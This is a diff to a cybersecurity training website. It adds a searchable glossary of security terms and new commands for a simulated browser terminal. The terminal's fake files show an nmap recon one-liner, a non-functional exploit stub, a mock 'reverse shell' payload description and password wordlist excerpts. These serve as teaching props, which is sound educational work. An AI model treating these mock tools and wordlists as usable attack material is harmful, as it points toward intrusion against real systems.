+  <p class="ssub">Searchable glossary of essential cybersecurity terms, acronyms, and concepts. Use the box below or press <code>Ctrl+G</code> to jump here anytime.</p>
+  <div class="gloss-search-wrap"><input type="text" id="glossSearch" placeholder="Search terms, acronyms, definitions..." autocomplete="off" spellcheck="false"></div>
+  <div class="gloss-count" id="glossCount"></div>
+  <div class="gloss-list" id="glossList">  <div class="gloss-item"><span class="g-term">CIA Triad</span><span class="g-tag">foundations</span><div class="g-def">Confidentiality, Integrity, and Availability — the core model of information security.</div></div>
+  <div class="gloss-item"><span class="g-term">AAA</span><span class="g-tag">foundations</span><div class="g-def">Authentication, Authorization, and Accounting: verify identity, grant permissions, log activity.</div></div>
+  <div class="gloss-item"><span class="g-term">Defense in Depth</span><span class="g-tag">foundations</span><div class="g-def">Layered security controls (physical, network, host, app, data) so no single failure is fatal.</div></div>
+  <div class="gloss-item"><span class="g-term">Risk</span><span class="g-tag">foundations</span><div class="g-def">Threat x Vulnerability x Impact; managed via mitigate, transfer, accept, or avoid.</div></div>
+  <div class="gloss-item"><span class="g-term">Zero-day</span><span class="g-tag">exploitation</span><div class="g-def">A vulnerability unknown to the vendor, so no patch exists yet.</div></div>
+  <div class="gloss-item"><span class="g-term">Kill Chain</span><span class="g-tag">ethicalhack</span><div class="g-def">Lockheed Martin model of attack stages: Recon, Weaponize, Deliver, Exploit, Install, C2, Actions.</div></div>
+  <div class="gloss-item"><span class="g-term">NIST CSF</span><span class="g-tag">foundations</span><div class="g-def">Framework with five functions: Identify, Protect, Detect, Respond, Recover.</div></div>
+  <div class="gloss-item"><span class="g-term">ISO 27001</span><span class="g-tag">foundations</span><div class="g-def">International standard for Information Security Management Systems (ISMS).</div></div>
+  <div class="gloss-item"><span class="g-term">SOC 2</span><span class="g-tag">foundations</span><div class="g-def">Audit framework for service providers' security, availability, and confidentiality controls.</div></div>
+  <div class="gloss-item"><span class="g-term">GDPR</span><span class="g-tag">legal</span><div class="g-def">EU regulation protecting personal data; breach notification within 72 hours.</div></div>
+  <div class="gloss-item"><span class="g-term">Root</span><span class="g-tag">linux</span><div class="g-def">The superuser account with unrestricted system control on Unix-like systems.</div></div>
+  <div class="gloss-item"><span class="g-term">Sudo</span><span class="g-tag">linux</span><div class="g-def">Run a command as another user (usually root) with logged authorization.</div></div>
+  <div class="gloss-item"><span class="g-term">SUID</span><span class="g-tag">privesc</span><div class="g-def">Set-user-ID permission bit that runs a program with the file owner's privileges.</div></div>
+  <div class="gloss-item"><span class="g-term">Kernel</span><span class="g-tag">linux</span><div class="g-def">Core OS component managing hardware, processes, and memory.</div></div>
+  <div class="gloss-item"><span class="g-term">SSH</span><span class="g-tag">networking</span><div class="g-def">Secure Shell — encrypted remote login and command execution on port 22.</div></div>
+  <div class="gloss-item"><span class="g-term">TCP/IP</span><span class="g-tag">networking</span><div class="g-def">The fundamental protocol suite of the internet: reliable transport over IP.</div></div>
+  <div class="gloss-item"><span class="g-term">DNS</span><span class="g-tag">networking</span><div class="g-def">Domain Name System — resolves hostnames to IP addresses on port 53.</div></div>
+  <div class="gloss-item"><span class="g-term">OSI Model</span><span class="g-tag">networking</span><div class="g-def">Seven-layer conceptual model: Physical, Data Link, Network, Transport, Session, Presentation, Application.</div></div>
+  <div class="gloss-item"><span class="g-term">Subnet Mask</span><span class="g-tag">networking</span><div class="g-def">Defines the network/host boundary of an IP address (e.g. /24 = 255.255.255.0).</div></div>
+  <div class="gloss-item"><span class="g-term">VPN</span><span class="g-tag">networking</span><div class="g-def">Encrypted tunnel that hides traffic and changes apparent location.</div></div>
+  <div class="gloss-item"><span class="g-term">Proxy</span><span class="g-tag">networking</span><div class="g-def">Intermediary that forwards requests, hiding the client and enabling interception.</div></div>
+  <div class="gloss-item"><span class="g-term">TLS</span><span class="g-tag">crypto</span><div class="g-def">Transport Layer Security — encrypts and authenticates HTTPS, SMTP, and more.</div></div>
+  <div class="gloss-item"><span class="g-term">OSINT</span><span class="g-tag">recon</span><div class="g-def">Open Source Intelligence: gathering data from public sources.</div></div>
+  <div class="gloss-item"><span class="g-term">Footprinting</span><span class="g-tag">recon</span><div class="g-def">Passive information gathering about a target before active interaction.</div></div>
+  <div class="gloss-item"><span class="g-term">Fingerprinting</span><span class="g-tag">scanning</span><div class="g-def">Identifying OS and services from their responses and banners.</div></div>
+  <div class="gloss-item"><span class="g-term">Port Scanning</span><span class="g-tag">scanning</span><div class="g-def">Probing hosts to discover open ports and services (e.g. with Nmap).</div></div>
+  <div class="gloss-item"><span class="g-term">Enumeration</span><span class="g-tag">scanning</span><div class="g-def">Extracting detailed info (users, shares, versions) from open services.</div></div>
+  <div class="gloss-item"><span class="g-term">Banner Grabbing</span><span class="g-tag">scanning</span><div class="g-def">Reading service banners to identify software versions.</div></div>
+  <div class="gloss-item"><span class="g-term">Shodan</span><span class="g-tag">recon</span><div class="g-def">Search engine for internet-exposed devices and banners.</div></div>
+  <div class="gloss-item"><span class="g-term">Google Dorking</span><span class="g-tag">recon</span><div class="g-def">Using advanced search operators to find sensitive/exposed data.</div></div>
+  <div class="gloss-item"><span class="g-term">OWASP</span><span class="g-tag">websecurity</span><div class="g-def">Open Web Application Security Project — publishes the Top 10 web risks.</div></div>
+  <div class="gloss-item"><span class="g-term">XSS</span><span class="g-tag">websecurity</span><div class="g-def">Cross-Site Scripting — injecting scripts that run in victims' browsers.</div></div>
+  <div class="gloss-item"><span class="g-term">SQL Injection</span><span class="g-tag">websecurity</span><div class="g-def">Manipulating SQL queries via user input to access/alter data.</div></div>
+  <div class="gloss-item"><span class="g-term">IDOR</span><span class="g-tag">websecurity</span><div class="g-def">Insecure Direct Object Reference — accessing objects via changed IDs.</div></div>
+  <div class="gloss-item"><span class="g-term">CSRF</span><span class="g-tag">websecurity</span><div class="g-def">Cross-Site Request Forgery — forcing a victim's session to act.</div></div>
+  <div class="gloss-item"><span class="g-term">RCE</span><span class="g-tag">exploitation</span><div class="g-def">Remote Code Execution — running arbitrary code on a target.</div></div>
+  <div class="gloss-item"><span class="g-term">LFI</span><span class="g-tag">websecurity</span><div class="g-def">Local File Inclusion — reading server files via path traversal.</div></div>
+  <div class="gloss-item"><span class="g-term">SSRF</span><span class="g-tag">websecurity</span><div class="g-def">Server-Side Request Forgery — making the server fetch internal resources.</div></div>
+  <div class="gloss-item"><span class="g-term">WAF</span><span class="g-tag">websecurity</span><div class="g-def">Web Application Firewall — filters malicious HTTP traffic.</div></div>
+  <div class="gloss-item"><span class="g-term">Metasploit</span><span class="g-tag">exploitation</span><div class="g-def">Offensive framework with modules for exploiting and post-exploitation.</div></div>
+  <div class="gloss-item"><span class="g-term">Payload</span><span class="g-tag">exploitation</span><div class="g-def">Code delivered and run after a vulnerability is triggered.</div></div>
+  <div class="gloss-item"><span class="g-term">Shellcode</span><span class="g-tag">exploitation</span><div class="g-def">Machine code injected to execute commands (often spawning a shell).</div></div>
+  <div class="gloss-item"><span class="g-term">Reverse Shell</span><span class="g-tag">postexp</span><div class="g-def">Target connects back to the attacker's listener — bypasses inbound firewalls.</div></div>
+  <div class="gloss-item"><span class="g-term">Bind Shell</span><span class="g-tag">postexp</span><div class="g-def">Attacker connects to a listener opened on the target.</div></div>
+  <div class="gloss-item"><span class="g-term">Persistence</span><span class="g-tag">postexp</span><div class="g-def">Techniques that keep access across reboots (cron, services, keys).</div></div>
+  <div class="gloss-item"><span class="g-term">Pivoting</span><span class="g-tag">postexp</span><div class="g-def">Routing through a compromised host to reach internal networks.</div></div>
+  <div class="gloss-item"><span class="g-term">C2</span><span class="g-tag">redteam</span><div class="g-def">Command and Control — attacker's channel to manage compromised hosts.</div></div>
+  <div class="gloss-item"><span class="g-term">Mimikatz</span><span class="g-tag">postexp</span><div class="g-def">Tool that dumps Windows credentials from memory (Kerberos, NTLM).</div></div>
+  <div class="gloss-item"><span class="g-term">SIEM</span><span class="g-tag">blueteam</span><div class="g-def">Security Information and Event Management — central log collection and alerts.</div></div>
+  <div class="gloss-item"><span class="g-term">EDR</span><span class="g-tag">blueteam</span><div class="g-def">Endpoint Detection and Response — monitors endpoints for threats.</div></div>
+  <div class="gloss-item"><span class="g-term">IDS / IPS</span><span class="g-tag">blueteam</span><div class="g-def">Intrusion Detection/Prevention System — network traffic monitoring.</div></div>
+  <div class="gloss-item"><span class="g-term">SOC</span><span class="g-tag">blueteam</span><div class="g-def">Security Operations Center — the team monitoring and responding to threats.</div></div>
+  <div class="gloss-item"><span class="g-term">IoC</span><span class="g-tag">blueteam</span><div class="g-def">Indicator of Compromise — evidence like IPs, hashes, or domains of an intrusion.</div></div>
+  <div class="gloss-item"><span class="g-term">SOAR</span><span class="g-tag">blueteam</span><div class="g-def">Security Orchestration, Automation and Response.</div></div>
+  <div class="gloss-item"><span class="g-term">Honeypot</span><span class="g-tag">blueteam</span><div class="g-def">Decoy system designed to lure and study attackers.</div></div>
+  <div class="gloss-item"><span class="g-term">Sandbox</span><span class="g-tag">malware</span><div class="g-def">Isolated environment for safely executing and analyzing malware.</div></div>
+  <div class="gloss-item"><span class="g-term">Malware</span><span class="g-tag">malware</span><div class="g-def">Malicious software: viruses, worms, trojans, ransomware, spyware, rootkits.</div></div>
+  <div class="gloss-item"><span class="g-term">Ransomware</span><span class="g-tag">malware</span><div class="g-def">Malware that encrypts data and demands payment for the key.</div></div>
+  <div class="gloss-item"><span class="g-term">Botnet</span><span class="g-tag">malware</span><div class="g-def">Network of compromised machines under attacker control.</div></div>
+  <div class="gloss-item"><span class="g-term">Rootkit</span><span class="g-tag">malware</span><div class="g-def">Malware that hides itself and maintains privileged access.</div></div>
+  <div class="gloss-item"><span class="g-term">Encryption</span><span class="g-tag">crypto</span><div class="g-def">Transforming data so only key holders can read it.</div></div>
+  <div class="gloss-item"><span class="g-term">Hashing</span><span class="g-tag">crypto</span><div class="g-def">One-way function producing a fixed digest; used for integrity.</div></div>
+  <div class="gloss-item"><span class="g-term">Symmetric Cipher</span><span class="g-tag">crypto</span><div class="g-def">Uses the same key to encrypt and decrypt (e.g. AES).</div></div>
+  <div class="gloss-item"><span class="g-term">Asymmetric Cipher</span><span class="g-tag">crypto</span><div class="g-def">Uses a public/private key pair (e.g. RSA, ECC).</div></div>
+  <div class="gloss-item"><span class="g-term">PKI</span><span class="g-tag">crypto</span><div class="g-def">Public Key Infrastructure — certificates, CAs, and trust.</div></div>
+  <div class="gloss-item"><span class="g-term">Certificate</span><span class="g-tag">crypto</span><div class="g-def">Digital credential binding a public key to an identity.</div></div>
+  <div class="gloss-item"><span class="g-term">Salt</span><span class="g-tag">crypto</span><div class="g-def">Random data added to passwords before hashing to defeat rainbow tables.</div></div>
+  <div class="gloss-item"><span class="g-term">CVE</span><span class="g-tag">exploitation</span><div class="g-def">Common Vulnerabilities and Exposures — public identifier for a specific flaw.</div></div>
+  <div class="gloss-item"><span class="g-term">CVSS</span><span class="g-tag">exploitation</span><div class="g-def">Common Vulnerability Scoring System — rates severity from 0-10.</div></div>
+  <div class="gloss-item"><span class="g-term">WEP / WPA / WPA2</span><span class="g-tag">wireless</span><div class="g-def">WiFi encryption standards; WEP is broken, WPA2-AES is the baseline, WPA3 adds SAE.</div></div>
+  <div class="gloss-item"><span class="g-term">Evil Twin</span><span class="g-tag">wireless</span><div class="g-def">Rogue access point impersonating a legitimate network to intercept traffic.</div></div>
+  <div class="gloss-item"><span class="g-term">Deauth Attack</span><span class="g-tag">wireless</span><div class="g-def">Forcing clients offline to capture handshakes or disrupt service.</div></div>
+  <div class="gloss-item"><span class="g-term">Bluejacking</span><span class="g-tag">wireless</span><div class="g-def">Sending unsolicited messages to nearby Bluetooth devices.</div></div>
+  <div class="gloss-item"><span class="g-term">Red Team</span><span class="g-tag">redteam</span><div class="g-def">Offensive team simulating real adversaries to test defenses.</div></div>
+  <div class="gloss-item"><span class="g-term">Blue Team</span><span class="g-tag">blueteam</span><div class="g-def">Defensive team detecting and responding to attacks.</div></div>
+  <div class="gloss-item"><span class="g-term">Purple Team</span><span class="g-tag">redteam</span><div class="g-def">Red and blue teams collaborating to improve security together.</div></div>
+  <div class="gloss-item"><span class="g-term">TTP</span><span class="g-tag">redteam</span><div class="g-def">Tactics, Techniques, and Procedures — how an adversary operates.</div></div>
+  <div class="gloss-item"><span class="g-term">MITRE ATT&CK</span><span class="g-tag">redteam</span><div class="g-def">Knowledge base of adversary tactics and techniques.</div></div>
+  <div class="gloss-item"><span class="g-term">Pentest</span><span class="g-tag">ethicalhack</span><div class="g-def">Penetration test — authorized simulated attack to find weaknesses.</div></div>
+  <div class="gloss-item"><span class="g-term">Bug Bounty</span><span class="g-tag">bugbounty</span><div class="g-def">Vendor program paying researchers for reported vulnerabilities.</div></div>
+  <div class="gloss-item"><span class="g-term">Responsible Disclosure</span><span class="g-tag">legal</span><div class="g-def">Privately reporting flaws and allowing time to fix before public release.</div></div>
+  <div class="gloss-item"><span class="g-term">CFAA</span><span class="g-tag">legal</span><div class="g-def">US Computer Fraud and Abuse Act — criminalizes unauthorized access.</div></div>
+  <div class="gloss-item"><span class="g-term">MFA</span><span class="g-tag">ossecurity</span><div class="g-def">Multi-Factor Authentication — requires two+ proofs of identity.</div></div>
+  <div class="gloss-item"><span class="g-term">Phishing</span><span class="g-tag">foundations</span><div class="g-def">Social engineering via fake messages to steal credentials or install malware.</div></div>
+  <div class="gloss-item"><span class="g-term">Social Engineering</span><span class="g-tag">foundations</span><div class="g-def">Manipulating people to divulge secrets or perform actions.</div></div>
+  <div class="gloss-item"><span class="g-term">MITM</span><span class="g-tag">networking</span><div class="g-def">Man-in-the-Middle — attacker relays/alters traffic between two parties.</div></div>
+  <div class="gloss-item"><span class="g-term">DDoS</span><span class="g-tag">networking</span><div class="g-def">Distributed Denial of Service — overwhelming a service with traffic.</div></div>
+  <div class="gloss-item"><span class="g-term">Brute Force</span><span class="g-tag">tools</span><div class="g-def">Trying many passwords/keys until one succeeds.</div></div>
+  <div class="gloss-item"><span class="g-term">Credential Stuffing</span><span class="g-tag">tools</span><div class="g-def">Reusing leaked username/password pairs across sites.</div></div></div>
+</div>
+
 
 </div>
 </div>
@@ -2580,6 +3960,8 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="shortcut-box">
     <h3>&#9881; Keyboard Shortcuts</h3>
     <div class="shortcut-row"><span class="sc-label">Search</span><kbd>Ctrl + K</kbd></div>
+    <div class="shortcut-row"><span class="sc-label">Quick nav 1-9</span><kbd>Ctrl + 1-9</kbd></div>
+    <div class="shortcut-row"><span class="sc-label">Glossary</span><kbd>Ctrl + G</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Terminal</span><kbd>Ctrl + `</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Previous section</span><kbd>Alt + &#8592;</kbd></div>
     <div class="shortcut-row"><span class="sc-label">Next section</span><kbd>Alt + &#8594;</kbd></div>
@@ -2692,6 +4074,7 @@ function toast(msg,type,icon){
   tc.appendChild(t);
   setTimeout(function(){if(t.parentElement){t.classList.add('out');setTimeout(function(){t.remove()},300)}},4000);
 }
+window._toast=toast;
 
 function updateStreakUI(){
   var el=document.getElementById('quizStreak');
@@ -2717,6 +4100,7 @@ function nav(sid){
     if(sid==='home'&&window._replayCounters)setTimeout(window._replayCounters,200);
     if(sid==='labs'&&window.renderLabs)window.renderLabs();
     if(sid==='progress'&&window.Progress)window.Progress.render();
+    if(sid==='glossary'&&window.renderGlossary)window.renderGlossary();
   },180);
   document.querySelectorAll('.n-it').forEach(n=>n.classList.remove('act'));
   let navEl=document.querySelector('.n-it[data-s="'+sid+'"]');
@@ -2729,6 +4113,7 @@ function nav(sid){
     var tab=b.dataset.tab;
     var active=false;
     if(sid==='home'&&tab==='home')active=true;
+    else if(sid==='glossary'&&tab==='home')active=true;
     else if(sid==='labs'&&tab==='labs')active=true;
     else if(sid==='progress'&&tab==='progress')active=true;
     else if(sid!=='home'&&sid!=='labs'&&sid!=='progress'&&tab==='modules')active=true;
@@ -2752,6 +4137,7 @@ function update(){
   let bc=document.getElementById('bc');
   if(cur==='labs'){bc.innerHTML='<span class="bc">'+(sec?sec.t:'Home')+'</span><span class="bc-s">/</span><span>Lab Center</span>'}
   else if(cur==='progress'){bc.innerHTML='<span class="bc">'+(sec?sec.t:'Home')+'</span><span class="bc-s">/</span><span>My Progress</span>'}
+  else if(cur==='glossary'){bc.innerHTML='<span class="bc" style="cursor:pointer" onclick="window.S(\'home\')">Home</span><span class="bc-s">/</span><span>Security Glossary</span>'}
   else if(sec&&sec.p!=='home'){
     bc.innerHTML='<span class="bc" style="cursor:pointer" onclick="window.S(\'home\')">'+sec.t.split('.')[0]+'</span><span class="bc-s">/</span><span>'+sec.t.replace(/^\d+\.\s*/,'')+'</span>';
   }else{
@@ -3527,7 +4913,7 @@ var CTF_CHALLENGES=[
 ];
 
 var TERM_CMDS={
-help:'Available commands:\n  help       - Show this help\n  clear      - Clear terminal\n  whoami     - Current user info\n  uname      - System information\n  ls         - List files\n  cat        - Read file contents\n  pwd        - Print working directory\n  echo       - Echo text\n  date       - Current date/time\n  id         - User identity\n  history    - Command history\n  tree       - Directory tree\n  score      - Quiz statistics\n  sudo       - Execute as superuser\n  man        - Manual pages\n  challenge  - CTF challenges\n  hint       - Command usage hints\n  hints      - Toggle auto-hints\n  -- Network --\n  ping       - Ping a host\n  nmap       - Network mapper\n  ifconfig   - Network interface info\n  ip         - IP address info\n  ss         - Socket statistics\n  netstat    - Network connections\n  curl       - Transfer URL\n  wget       - Download file\n  ssh        - SSH connection\n  traceroute - Trace network path\n  dig        - DNS lookup\n  host       - DNS lookup\n  nslookup   - DNS lookup\n  whois      - Domain/IP information\n  -- Security Tools --\n  hydra      - Brute force login\n  john       - Password cracker\n  sqlmap     - SQL injection tool\n  gobuster   - Directory brute force\n  nikto      - Web server scanner\n  -- System --\n  ps         - Running processes\n  tcpdump    - Packet capture\n  nc         - Netcat connection\n  grep       - Search text\n  base64     - Base64 encode/decode\n  python     - Python interpreter\n  hashcat    - Hash cracker\n  exit       - Exit terminal',
+help:'Available commands:\n  help       - Show this help\n  clear      - Clear terminal\n  whoami     - Current user info\n  uname      - System information\n  ls         - List files\n  cat        - Read file contents\n  pwd        - Print working directory\n  echo       - Echo text\n  date       - Current date/time\n  id         - User identity\n  history    - Command history\n  tree       - Directory tree\n  score      - Quiz statistics\n  sudo       - Execute as superuser\n  man        - Manual pages\n  challenge  - CTF challenges\n  hint       - Command usage hints\n  hints      - Toggle auto-hints\n  glossary   - Search the security glossary\n  cheatsheet - Open a section quick reference\n  -- Network --\n  ping       - Ping a host\n  nmap       - Network mapper\n  ifconfig   - Network interface info\n  ip         - IP address info\n  ss         - Socket statistics\n  netstat    - Network connections\n  curl       - Transfer URL\n  wget       - Download file\n  ssh        - SSH connection\n  traceroute - Trace network path\n  dig        - DNS lookup\n  host       - DNS lookup\n  nslookup   - DNS lookup\n  whois      - Domain/IP information\n  -- Security Tools --\n  hydra      - Brute force login\n  john       - Password cracker\n  sqlmap     - SQL injection tool\n  gobuster   - Directory brute force\n  nikto      - Web server scanner\n  -- System --\n  ps         - Running processes\n  tcpdump    - Packet capture\n  nc         - Netcat connection\n  grep       - Search text\n  base64     - Base64 encode/decode\n  python     - Python interpreter\n  hashcat    - Hash cracker\n  exit       - Exit terminal',
 clear:null,
 whoami:'visitor@cybersec-hub',
 uname:'Linux cybersec-hub 5.15.0-kali1-amd64 x86_64 GNU/Linux',
@@ -3571,9 +4957,30 @@ score:function(){
   var total=SEC.length-1;
   var completed=Object.keys(done).length;
   var pct=total?Math.round(completed/total*100):0;
-  return '=== Quiz Statistics ===\nSections completed: '+completed+'/'+total+' ('+pct+'%)\nTotal questions: '+totalQuizzes+'\nCorrect answers: '+correctQuizzes+'\nCurrent streak: '+quizStreak+'\nAccuracy: '+(totalQuizzes?Math.round(correctQuizzes/totalQuizzes*100):0)+'%';
-},
-cat:function(args){
+    return '=== Quiz Statistics ===\nSections completed: '+completed+'/'+total+' ('+pct+'%)\nTotal questions: '+totalQuizzes+'\nCorrect answers: '+correctQuizzes+'\nCurrent streak: '+quizStreak+'\nAccuracy: '+(totalQuizzes?Math.round(correctQuizzes/totalQuizzes*100):0)+'%';
+  },
+  glossary:function(args){
+    if(!args)return 'glossary - searchable security term index\n\nUsage:\n  glossary <term>      Look up a term (e.g. glossary xss)\n  glossary             Show this help\n\nTry: CVE, SIEM, XSS, IDOR, MITRE, OSINT, EDR, TTP, MITM, PKI';
+    var q=args.toLowerCase();
+    var m=GLOSSARY.filter(function(g){return g[0].toLowerCase().indexOf(q)>=0||g[2].toLowerCase().indexOf(q)>=0||g[1].toLowerCase().indexOf(q)>=0});
+    if(!m.length)return 'glossary: no terms matching "'+args+'"';
+    return m.slice(0,8).map(function(g){
+      var sec=SEC.filter(function(s){return s.s===g[1]})[0];
+      return g[0]+'  ['+g[1]+']\n  '+g[2]+(sec?'  (see: '+sec.t.replace(/^\d+\.\s*/,'')+')':'');
+    }).join('\n')+(m.length>8?'\n... and '+m.length+' more.':'\n'+m.length+' match(es). Try Ctrl+G for the full glossary.');
+  },
+  cheatsheet:function(args){
+    if(!args)return 'cheatsheet - open a section quick reference\n\nUsage:\n  cheatsheet <section>   e.g. cheatsheet linux, cheatsheet websecurity\n\nSections: foundations, linux, termux, networking, recon, scanning, ethicalhack, exploitation, bugbounty, tools, privesc, postexp, websecurity, ossecurity, malware, forensics, wireless, crypto, cloud, mobile, redteam, blueteam, homelab, career, legal';
+    var sid=args.toLowerCase().trim();
+    if(!document.getElementById('sec-'+sid))return 'cheatsheet: no section "'+args+'"';
+    nav(sid);
+    setTimeout(function(){
+      var sec=document.getElementById('sec-'+sid),cs=sec?sec.querySelector('.cs-block'):null;
+      if(cs){cs.scrollIntoView({behavior:'smooth',block:'start'});cs.classList.add('cs-flash');setTimeout(function(){cs.classList.remove('cs-flash')},1600)}
+    },350);
+    return 'Opening quick reference for "'+sid+'"...';
+  },
+  cat:function(args){
   if(!args)return'cat: missing file operand';
   var files={'notes.txt':'# Security Notes\n- Always get written permission before testing\n- Document everything\n- Use VPN during recon','exploit.db':'Database loaded: 1,337 exploits\n[1] vsftpd_backdoor - vsftpd 2.3.4\n[2] ms17_010_eternalblue - SMB\n[3] shellshock_cve_2014_6271 - Bash','recon.sh':'#!/bin/bash\necho "[*] Starting recon..."\nnmap -sV -sC -O -A $1\necho "[*] Done."','exploit.py':'#!/usr/bin/env python3\nimport socket\n\ndef exploit(target, port):\n    payload = b"\\x90" * 64\n    print(f"[*] Sending to {target}:{port}")\n    return payload','payload.bin':'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\n[shellcode] nop sled + reverse shell payload\nArch: x64 | Size: 256 bytes','rockyou.txt':'[rockyou.txt truncated — 14,344,391 lines]\n123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\n...','common.txt':'admin\nlogin\nwp-admin\nadministrator\nroot\nbackup\nadmin123\nmanager\ncontrol\nadmin1\n...'};
   var f=args.split(' ').pop();
@@ -4066,6 +5473,15 @@ document.addEventListener('keydown',function(e){
     var sm=document.getElementById('sm');sm.classList.add('show');
     setTimeout(function(){document.getElementById('sInput2').focus()},100);
   }
+  if((e.ctrlKey||e.metaKey)&&!e.shiftKey&&!e.altKey&&e.key>='1'&&e.key<='9'&&!e.target.matches('input,textarea,select')){
+    e.preventDefault();
+    var idx=parseInt(e.key);
+    if(SEC[idx]&&SEC[idx].s!=='home')nav(SEC[idx].s);
+  }
+  if((e.ctrlKey||e.metaKey)&&(e.key||'').toLowerCase()==='g'){
+    e.preventDefault();
+    nav('glossary');
+  }
   if(e.key==='Escape'){
     var sm=document.getElementById('sm');if(sm.classList.contains('show')){sm.classList.remove('show');return}
     var sc=document.getElementById('shortcutModal');if(sc.classList.contains('show')){sc.classList.remove('show');return}
@@ -4132,7 +5548,31 @@ window._openVidPanel=function(secId,vidId){_openYoutube(vidId)};
 window._openYoutube=_openYoutube;
 
 window.S=nav;
-buildNav();initSearch();initNav();initCollapsibles();initCopyButtons();initQuizzes();initTerminal();initHomeCards();initExercises();initBoot();initBottomNav();initReadingTime();initSync();
+var GLOSSARY=[["CIA Triad", "foundations", "Confidentiality, Integrity, and Availability — the core model of information security."], ["AAA", "foundations", "Authentication, Authorization, and Accounting: verify identity, grant permissions, log activity."], ["Defense in Depth", "foundations", "Layered security controls (physical, network, host, app, data) so no single failure is fatal."], ["Risk", "foundations", "Threat x Vulnerability x Impact; managed via mitigate, transfer, accept, or avoid."], ["Zero-day", "exploitation", "A vulnerability unknown to the vendor, so no patch exists yet."], ["Kill Chain", "ethicalhack", "Lockheed Martin model of attack stages: Recon, Weaponize, Deliver, Exploit, Install, C2, Actions."], ["NIST CSF", "foundations", "Framework with five functions: Identify, Protect, Detect, Respond, Recover."], ["ISO 27001", "foundations", "International standard for Information Security Management Systems (ISMS)."], ["SOC 2", "foundations", "Audit framework for service providers' security, availability, and confidentiality controls."], ["GDPR", "legal", "EU regulation protecting personal data; breach notification within 72 hours."], ["Root", "linux", "The superuser account with unrestricted system control on Unix-like systems."], ["Sudo", "linux", "Run a command as another user (usually root) with logged authorization."], ["SUID", "privesc", "Set-user-ID permission bit that runs a program with the file owner's privileges."], ["Kernel", "linux", "Core OS component managing hardware, processes, and memory."], ["SSH", "networking", "Secure Shell — encrypted remote login and command execution on port 22."], ["TCP/IP", "networking", "The fundamental protocol suite of the internet: reliable transport over IP."], ["DNS", "networking", "Domain Name System — resolves hostnames to IP addresses on port 53."], ["OSI Model", "networking", "Seven-layer conceptual model: Physical, Data Link, Network, Transport, Session, Presentation, Application."], ["Subnet Mask", "networking", "Defines the network/host boundary of an IP address (e.g. /24 = 255.255.255.0)."], ["VPN", "networking", "Encrypted tunnel that hides traffic and changes apparent location."], ["Proxy", "networking", "Intermediary that forwards requests, hiding the client and enabling interception."], ["TLS", "crypto", "Transport Layer Security — encrypts and authenticates HTTPS, SMTP, and more."], ["OSINT", "recon", "Open Source Intelligence: gathering data from public sources."], ["Footprinting", "recon", "Passive information gathering about a target before active interaction."], ["Fingerprinting", "scanning", "Identifying OS and services from their responses and banners."], ["Port Scanning", "scanning", "Probing hosts to discover open ports and services (e.g. with Nmap)."], ["Enumeration", "scanning", "Extracting detailed info (users, shares, versions) from open services."], ["Banner Grabbing", "scanning", "Reading service banners to identify software versions."], ["Shodan", "recon", "Search engine for internet-exposed devices and banners."], ["Google Dorking", "recon", "Using advanced search operators to find sensitive/exposed data."], ["OWASP", "websecurity", "Open Web Application Security Project — publishes the Top 10 web risks."], ["XSS", "websecurity", "Cross-Site Scripting — injecting scripts that run in victims' browsers."], ["SQL Injection", "websecurity", "Manipulating SQL queries via user input to access/alter data."], ["IDOR", "websecurity", "Insecure Direct Object Reference — accessing objects via changed IDs."], ["CSRF", "websecurity", "Cross-Site Request Forgery — forcing a victim's session to act."], ["RCE", "exploitation", "Remote Code Execution — running arbitrary code on a target."], ["LFI", "websecurity", "Local File Inclusion — reading server files via path traversal."], ["SSRF", "websecurity", "Server-Side Request Forgery — making the server fetch internal resources."], ["WAF", "websecurity", "Web Application Firewall — filters malicious HTTP traffic."], ["Metasploit", "exploitation", "Offensive framework with modules for exploiting and post-exploitation."], ["Payload", "exploitation", "Code delivered and run after a vulnerability is triggered."], ["Shellcode", "exploitation", "Machine code injected to execute commands (often spawning a shell)."], ["Reverse Shell", "postexp", "Target connects back to the attacker's listener — bypasses inbound firewalls."], ["Bind Shell", "postexp", "Attacker connects to a listener opened on the target."], ["Persistence", "postexp", "Techniques that keep access across reboots (cron, services, keys)."], ["Pivoting", "postexp", "Routing through a compromised host to reach internal networks."], ["C2", "redteam", "Command and Control — attacker's channel to manage compromised hosts."], ["Mimikatz", "postexp", "Tool that dumps Windows credentials from memory (Kerberos, NTLM)."], ["SIEM", "blueteam", "Security Information and Event Management — central log collection and alerts."], ["EDR", "blueteam", "Endpoint Detection and Response — monitors endpoints for threats."], ["IDS / IPS", "blueteam", "Intrusion Detection/Prevention System — network traffic monitoring."], ["SOC", "blueteam", "Security Operations Center — the team monitoring and responding to threats."], ["IoC", "blueteam", "Indicator of Compromise — evidence like IPs, hashes, or domains of an intrusion."], ["SOAR", "blueteam", "Security Orchestration, Automation and Response."], ["Honeypot", "blueteam", "Decoy system designed to lure and study attackers."], ["Sandbox", "malware", "Isolated environment for safely executing and analyzing malware."], ["Malware", "malware", "Malicious software: viruses, worms, trojans, ransomware, spyware, rootkits."], ["Ransomware", "malware", "Malware that encrypts data and demands payment for the key."], ["Botnet", "malware", "Network of compromised machines under attacker control."], ["Rootkit", "malware", "Malware that hides itself and maintains privileged access."], ["Encryption", "crypto", "Transforming data so only key holders can read it."], ["Hashing", "crypto", "One-way function producing a fixed digest; used for integrity."], ["Symmetric Cipher", "crypto", "Uses the same key to encrypt and decrypt (e.g. AES)."], ["Asymmetric Cipher", "crypto", "Uses a public/private key pair (e.g. RSA, ECC)."], ["PKI", "crypto", "Public Key Infrastructure — certificates, CAs, and trust."], ["Certificate", "crypto", "Digital credential binding a public key to an identity."], ["Salt", "crypto", "Random data added to passwords before hashing to defeat rainbow tables."], ["CVE", "exploitation", "Common Vulnerabilities and Exposures — public identifier for a specific flaw."], ["CVSS", "exploitation", "Common Vulnerability Scoring System — rates severity from 0-10."], ["WEP / WPA / WPA2", "wireless", "WiFi encryption standards; WEP is broken, WPA2-AES is the baseline, WPA3 adds SAE."], ["Evil Twin", "wireless", "Rogue access point impersonating a legitimate network to intercept traffic."], ["Deauth 